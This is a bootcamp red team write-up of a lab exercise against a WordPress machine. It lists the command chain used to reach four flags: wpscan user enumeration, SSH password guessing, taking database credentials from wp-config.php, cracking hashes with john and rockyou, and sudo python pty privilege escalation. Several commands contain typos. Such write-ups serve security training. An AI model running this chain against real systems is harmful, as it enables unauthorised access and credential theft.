# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap ... `nmap -sV 192.168.1.110`
  ![https://github.com/shansen18/BootCamp/blob/ee4d8a4383daf6daa06e785e74d52db8662d4d84/Final_Project/Images/nmap.PNG]
```

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp ssh
  - 80/tcp http
  - 111/tcp rpcbind
  - 139/tcp Netbois
  - 445/tcp Microsoft-ds




The following vulnerabilities were identified on each target:
- Target 1
  - Vulnerable Word Press (wpscan user enumeration)
  - Weak user password
  - Misconfigured User Privileges leading to privilege escalation
  - Unsalted passwords


### Exploitation


The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: `b9bbcb33ellb80be759c4e844862482d`
    - **Exploit Used**
      - WPscan was used from the attack machine to enumerate the users on the Target1 wordpress site
      - The Command use
        - `wpscan --url 192.168.1.110/wordpress/ -e u`
      - SSH'd into `192.168.1.110` using the user `Michael` guessed the weak password `Michael`
      - Navigated to /var/wwww/html/
      - Ran `nano services.html` and in the footer information found Flag1
![Flag1](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag1.PNG)

  - `flag2.txt`:`flag2{fc3fd58dcdad9ab23faca6e9a3e581c}`
    - **Exploit Used**
      - Flag2 was located while exploring `Target1` to find other potential useful files.
      - `cd ..`
      - `ls`
      - `nano flag2.txt`
![flag2](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag2.PNG)

 - `flag3.txt`:`flag3{afc01ab56b50591e7dccf93122770cd2}`
    - **Exploit Used**
      - During infiltration `wp-config.php` was found at `/var/www.html/wordpress`
      - `nano wp-config.php` and found the admin user is `root` and the password is `R@v3nSecurity`
      - `Crtl X` to exit nano.
      - `myspql --user=root --password=R@v3nSecurity -h 127.0.0.1` to enter the database
      - `showdatabases;` to view databases
      - `use wordpress;` to use the wordpress database
      - `select * from wp_posts;` to find flag3 and flag4 in wp_posts.
      - `select * from wp_users;` to find users and password hashes.
![dbusername](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/databasepswrd.PNG)
![Flag3](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/databasepswrd.PNG)

 - `flag4.txt`:`flag4{715dea6c055b9fe3337544932f2941ce}`
    - **Exploit Used**
      - Simple password and unsalted hash
        - Created a hash.txt that contained user `steven` hash `$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/` on attacking machine
        - Copied `Rockyou.txt` from `/usr/share/wordlists/rockyou.txt wp_hashes.txt` incase it is needed for another hash crack. 
        - Ran `john hash.txt --wordlist=rockyou.txt` and found that the password is `pink84`
        - Ran `-ssh steven@192.168.1.110` using pink84 as the password. 
        - Ran `sudo python -c "import pty;pty.spawn('/bin/bash')"` this gave Root privileges
        - `CD /root`
        - `ls` saw flag4.txt
        - `cat flag4.txt` to find the flag. 
        ![flag4](https://github.com/shansen18/BootCamp/blob/main/Final_Project/Images/Flag4.PNG)